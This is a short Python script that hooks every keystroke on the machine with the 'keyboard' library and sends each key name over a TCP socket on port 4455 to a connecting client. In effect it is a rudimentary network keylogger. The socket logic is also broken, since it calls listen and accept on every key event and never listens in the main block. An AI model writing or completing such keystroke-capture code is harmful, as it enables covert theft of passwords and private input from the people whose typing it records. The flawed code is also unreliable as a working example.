import socket
from pynput.keyboard import Key, Listener
import keyboard


HOST, PORT = "127.0.0.1", 4455
ADDR = (HOST, PORT)
FORMAT = "utf-8"
SIZE = 1024




def main():
    print("[STARTING] server is starting.")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
    server.listen()
    print("[LISTENING] serveris listening.")
    while True:
        conn, addr = server.accept()
        print(f"[NEW CONNECTION] {addr} connected.")
        keyboard.hook(handle_keyboard)
        keyboard.wait("esc")
        




def handle_keyboard(event):
    server.listen()
    print("[LISTENING] serveris listening.")
    conn, addr = server.accept()
    if event.event_type == 'down':
        conn.send(event.name.encode(FORMAT))
    conn.recv(SIZE).decode(FORMAT)








if __name__ == "__main__":
    print("[STARTING] server is starting.")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)

    keyboard.hook(handle_keyboard)
    keyboard.wait("esc")

    
